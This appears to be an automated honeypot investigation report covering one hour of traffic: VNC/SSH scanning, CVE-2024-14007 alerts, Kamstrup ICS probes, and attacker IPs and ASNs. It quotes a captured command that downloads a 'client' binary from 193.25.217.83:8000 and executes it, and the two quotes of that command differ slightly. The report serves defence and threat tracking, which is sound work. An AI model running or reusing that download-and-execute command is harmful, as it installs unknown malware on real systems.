# Investigation Report: 2026-03-04T04:00:03Z to 2026-03-04T05:00:03Z

## Investigation Scope
- investigation_start: 2026-03-04T04:00:03Z
- investigation_end: 2026-03-04T05:00:03Z
- completion_status: Complete
- degraded_mode: false

## Executive Triage Summary
- Top services of interest include VNC (ports 5900-5926), SSH (port 22), and SMTP (port 25).
- A significant number of attacks (2352) are related to "GPL INFO VNC server response" and "ET SCAN MS Terminal Server Traffic on Non-standard Port" (227).
- Identified "CVE-2024-14007" with 2 occurrences.
- Adbhoney honeypot captured a notable command attempting to download and execute a client from `http://193.25.217.83:8000/client`.
- Conpot honeypot observed activity related to the `kamstrup_protocol`, indicating potential ICS/OT targeting.
- A large volume of traffic originates from known attacker and mass scanner IPs.
- Top attacking countries are the United States, Ukraine, and Australia.

## Candidate Discovery Summary
- Total attack events: 2791
- Top 5 attacking countries: United States (1617), Ukraine (214), Australia (176), Romania (164), United Kingdom (84).
- Top 10 attacker source IPs account for 1530 events.
- 10 distinct alert signatures and 1 CVE were identified.
- 8 alert categories were observed, with "Misc activity" and "Generic Protocol Command Decode" being the most frequent.
- 10 distinct usernames and 10 distinct passwords were captured by honeypots.
- P0f identified primarily Windows NT kernel and Linux 2.2.x-3.x operating systems.
- Redis honeypot showed no activity.
- Adbhoney captured 2 unique inputs and no malware samples.
- Conpot captured 1 unique input and detected 1 protocol.
- Tanner honeypot observed 3 unique URI paths.
- Source IP reputation categorized 858 IPs as "known attacker" and 204 as "mass scanner."
- Timeline shows consistent event volume throughout the hour with fluctuations.
- Key investigative fields such as `alert.signature`, `alert.cve.id`, `http.url`, and `src_ip` were present.

## Emerging n-day Exploitation
- **cve/signature mapping**: CVE-2024-14007
  - **evidence summary**: 2 alerts mapping to CVE-2024-14007.
  - **affected service/port**: Not explicitly specified in the CVE output, but often related to network services.
  - **confidence**: High
  - **operational notes**: Monitor for further exploitation attempts related to CVE-2024-14007. Investigate specific services/ports targeted in the raw events.

## Novel or Zero-Day Exploit Candidates
- No strong evidence for novel or zero-day exploit candidates at this time. The Adbhoney activity is suspicious and requires further investigation, but lacks direct exploit-like signatures.

## Botnet/Campaign Infrastructure Mapping
- **item_id**: 1
  - **campaign_shape**: Spray (indicated by mass scanning activity and diverse targeted ports).
  - **suspected_compromised_src_ips**: 136.114.97.84 (278), 129.212.179.18 (236), 129.212.188.196 (232), 77.83.39.212 (202), 129.212.184.194 (100).
  - **ASNs / geo hints**:
    - DigitalOcean, LLC (ASN 14061) - 992 counts (Cloud provider, frequently abused)
    - Google LLC (ASN 396982) - 393 counts (Cloud provider)
    - Kprohost LLC (ASN 214940) - 202 counts (Ukraine)
    - Unmanaged Ltd (ASN 47890) - 158 counts
    - Amazon.com, Inc. (ASN 16509) - 104 counts
  - **suspected_staging indicators**: `http://193.25.217.83:8000/client` (from Adbhoney input, supporting evidence: `cd /tmp && busybox wget http://193.25.217.83:8000/client && wget http://193.25.217.83:8000/client -o client && chmod 744 client && chmod +x ./client && ./client`)
  - **suspected_c2 indicators**: `193.25.217.83:8000` (implied by the Adbhoney malware download command)
  - **confidence**: Medium (for campaign shape and staging/C2 due to limited direct C2 traffic observation)
  - **operational notes**: Block `193.25.217.83` and monitor for connections to this IP. Further analysis of the downloaded "client" binary is required.

## Odd-Service / Minutia Attacks
- **service_fingerprint**: `kamstrup_protocol` (Conpot honeypot)
  - **why it’s unusual/interesting**: Kamstrup protocol is associated with smart metering and utility infrastructure, indicating potential targeting of ICS/OT environments, which is unusual for typical internet-wide scanning.
  - **evidence summary**: 3 events, input `b'0018080404030807080508060401050106010503060302010203ff0100010000120000002b0009080304030303020301003300260024001d0020ef530790da655ee34c15fde74cbbb9765f80b86f53063f8c30fb9911f8'`
  - **confidence**: Medium
  - **recommended monitoring pivots**: Monitor for other ICS/OT protocols or unusual activity on ports commonly associated with industrial control systems. Investigate source IPs targeting this protocol for further context.

## Known-Exploit / Commodity Exclusions
- **Credential Noise**: "user" and "admin" are common usernames, and "user", (empty string), "12345" are common passwords observed across multiple honeypots.
- **Scanning Activity**: "ET SCAN MS Terminal Server Traffic on Non-standard Port" signature, high counts of "mass scanner" IPs, and the prevalence of VNC (59xx) and SSH (22) port scanning from various countries, especially the US and Australia for VNC.
- **Common Bot Patterns**: "SURICATA IPv4 truncated packet" and "SURICATA AF-PACKET truncated packet" indicate common network noise or scanning behavior. "ET DROP Dshield Block Listed Source group 1" indicates activity from known malicious IPs.
- **Web Scanning**: Tanner honeypot observed requests for common WordPress paths (`/wp-includes/js/jquery/jquery-migrate.min.js,qver=1.4.1.pagespeed.jm.C2obERNcWh.js`, `/wp-includes/js/jquery/jquery.js,qver=1.12.4.pagespeed.jm.pPCPAKkkss.js`) indicating opportunistic web application scanning.

## Infrastructure & Behavioral Classification
- **Exploitation vs. Scanning**: The majority of activity appears to be scanning (VNC, SSH, web paths), with a confirmed n-day exploitation attempt (CVE-2024-14007) and a suspected malware delivery attempt via Adbhoney.
- **Campaign Shape**: Predominantly spray-and-pray scanning across various services and IPs, with a specific malware delivery attempt indicating a more targeted action from `193.25.217.83`.
- **Infra Reuse Indicators**: High counts from ASNs associated with cloud providers (DigitalOcean, Google, Amazon) suggest the use of ephemeral infrastructure or compromised cloud instances for attack origination.
- **Odd-Service Fingerprints**: `kamstrup_protocol` activity on Conpot highlights targeting of specialized ICS/OT services.

## Evidence Appendix
- **Emerging n-day Exploitation (CVE-2024-14007)**:
  - **source IPs with counts**: Missing from direct CVE tool output, requires further drill-down.
  - **ASNs with counts**: Missing, requires further drill-down.
  - **target ports/services**: Missing, requires further drill-down.
  - **paths/endpoints**: Missing, requires further drill-down.
  - **payload/artifact excerpts**: Missing, requires further drill-down.
  - **staging indicators**: unavailable
  - **temporal checks results**: unavailable

- **Botnet/Campaign Infrastructure Mapping (item_id 1)**:
  - **source IPs with counts**: 136.114.97.84 (278), 129.212.179.18 (236), 129.212.188.196 (232), 77.83.39.212 (202), 129.212.184.194 (100), 165.245.138.210 (94), 170.64.152.136 (92), 170.64.156.232 (84), 80.94.92.184 (82), 140.235.19.89 (57).
  - **ASNs with counts**: DigitalOcean, LLC (ASN 14061) (992), Google LLC (ASN 396982) (393), Kprohost LLC (ASN 214940) (202), Unmanaged Ltd (ASN 47890) (158), Amazon.com, Inc. (ASN 16509) (104).
  - **target ports/services**: Heavily varied across many services as indicated by country-to-port mapping. Specific for malware download: 8000/TCP.
  - **paths/endpoints**: `/client` (Adbhoney)
  - **payload/artifact excerpts**: `cd /tmp && busybox wget http://193.25.217.83:8000/client && wget http://193.25.217.83:8000/client && curl http://193.25.217.83:8000/client -o client && chmod 744 client && chmod +x ./client && ./client` (Adbhoney input)
  - **staging indicators**: `http://193.25.217.83:8000/client`
  - **temporal checks results**: unavailable

## Indicators of Interest
- **IPs**:
    - `193.25.217.83` (Suspected C2/Staging for malware download)
    - `136.114.97.84` (Top attacking IP)
    - `129.212.179.18` (Top attacking IP)
    - `129.212.188.196` (Top attacking IP)
    - `77.83.39.212` (Top attacking IP)
- **URLs/Paths**:
    - `http://193.25.217.83:8000/client` (Malware download URL)
- **Payload Fragments**:
    - `cd /tmp && busybox wget ...` (Adbhoney input command)
- **CVEs**:
    - `CVE-2024-14007`

## Backend Tool Issues
- No tool failures were explicitly reported.
- Some tools (e.g., `suricata_cve_samples`) were not called, leading to missing detailed evidence for CVEs beyond count. This weakens the depth of information for Emerging n-day Exploitation.